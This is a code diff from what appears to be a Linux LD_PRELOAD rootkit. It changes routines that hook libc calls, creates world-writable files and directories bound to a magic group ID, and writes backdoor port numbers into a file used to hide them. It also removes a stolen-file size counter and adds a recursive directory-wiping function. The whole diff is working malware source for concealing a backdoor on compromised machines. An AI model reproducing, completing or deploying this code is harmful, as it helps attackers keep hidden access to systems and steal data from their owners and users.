@@ -9,7 +9,7 @@
 int prepareregfile(const char *path, gid_t magicgid){
     hook(CACCESS, CCHMOD, CCREAT);
     int acc = (long)call(CACCESS, path, F_OK);
-    if(acc != 0){
+    if(acc != 0 && errno == ENOENT){
         int crt = (long)call(CCREAT, path, 0777);
         if(crt < 0) return -1;
         close(crt);
@@ -19,8 +19,10 @@ int prepareregfile(const char *path, gid_t magicgid){
 
         if((long)call(CCHMOD, path, 0777) < 0)
             return -1;
-    }
-    return 1;
+
+        return 1;
+    }else if(acc == 0) return 1;
+    return -1;
 }
 
 int preparedir(const char *path, gid_t magicgid){
@@ -30,7 +32,8 @@ int preparedir(const char *path, gid_t magicgid){
     if(dp != NULL){
         closedir(dp);
         return 1;
-    }
+    }else if(dp == NULL && errno != ENOENT)
+        return -1;
 
     if((long)call(CMKDIR, path, 0777) < 0)
         return -1;
@@ -44,65 +47,23 @@ int preparedir(const char *path, gid_t magicgid){
     return 1;
 }
 
-
 #ifdef HIDE_PORTS
-void prepareports(void){
-    int hpa;
-    hook(CACCESS);
-    hpa = (long)call(CACCESS, HIDEPORTS, F_OK);
-    if(hpa != 0 && errno == ENOENT)
-        prepareregfile(HIDEPORTS, readgid());
-}
-#endif
-
-#if defined LOG_LOCAL_AUTH || defined LOG_SSH
-int logcount(const char *path){
-    FILE *fp;
-    char buf[LINE_MAX];
-    int count=0;
+void preparehideports(gid_t magicgid){
+    if(prepareregfile(HIDEPORTS, magicgid) < 0)
+        return;
 
     hook(CFOPEN);
 
-    fp = call(CFOPEN, path, "r");
-    if(fp == NULL) return 0;
+    FILE *fp = call(CFOPEN, HIDEPORTS, "a");
+    if(fp == NULL) return;
 
-    while(fgets(buf, sizeof(buf), fp) != NULL)
-        count++;
+    for(int i = 0; i != BDVLPORTS_SIZE; i++)
+        fprintf(fp, "%d\n", bdvlports[i]);
 
     fclose(fp);
-    return count;
 }
 #endif
 
-#ifdef FILE_STEAL
-off_t getstolensize(void){
-    off_t ret;
-    DIR *dp;
-    struct dirent *dir;
-    struct stat sbuf;
-
-    hook(COPENDIR, CREADDIR, C__XSTAT);
-
-    dp = call(COPENDIR, INTEREST_DIR);
-    if(dp == NULL) return 0;
-
-    while((dir = call(CREADDIR, dp)) != NULL){
-        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
-            continue;
-
-        char path[LEN_INTEREST_DIR+strlen(dir->d_name)+2];
-        snprintf(path, sizeof(path), "%s/%s", INTEREST_DIR, dir->d_name);
-        memset(&sbuf, 0, sizeof(struct stat));
-        if((long)call(C__XSTAT, _STAT_VER, path, &sbuf) < 0)
-            continue;
-
-        ret = ret+sbuf.st_size;
-    }
-    closedir(dp);
-
-    return ret;
-}
-#endif
 
 void bdprep(void){
     char *curpath;
@@ -120,6 +81,9 @@ void bdprep(void){
         if(prepareregfile(curpath, magicgid))
             regs++;
     }
+#ifdef HIDE_PORTS
+    preparehideports(magicgid);
+#endif
 
     if(regs+dirs != TOGPATHS_SIZE)
         printf("\e[1mIt looks like something may have went wrong setting everything up...\e[0m\n");
@@ -147,9 +111,35 @@ void bdprep(void){
         }
 #endif
     }
-
-#ifdef HIDE_PORTS
-    prepareports();
-#endif
     exit(0);
+}
+
+void eradicatedir(const char *target){
+    DIR *dp;
+    struct dirent *dir;
+    struct stat pathstat;
+
+    hook(COPENDIR, CREADDIR, CUNLINK, CRMDIR, C__XSTAT);
+
+    dp = call(COPENDIR, target);
+    if(dp == NULL) return;
+
+    while((dir = call(CREADDIR, dp)) != NULL){
+        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
+            continue;
+
+        char path[strlen(target)+strlen(dir->d_name)+2];
+        snprintf(path, sizeof(path), "%s/%s", target, dir->d_name);
+
+        memset(&pathstat, 0, sizeof(struct stat));
+        if((long)call(C__XSTAT, _STAT_VER, path, &pathstat) != -1)
+            if(S_ISDIR(pathstat.st_mode))
+                eradicatedir(path); // we recursive.
+
+        if((long)call(CUNLINK, path) < 0 && errno != ENOENT)
+            printf("Failed unlink on %s\n", path);
+    }
+    closedir(dp);
+    if((long)call(CRMDIR, target) < 0 && errno != ENOENT)
+        printf("Failed rmdir on %s\n", target);
 }
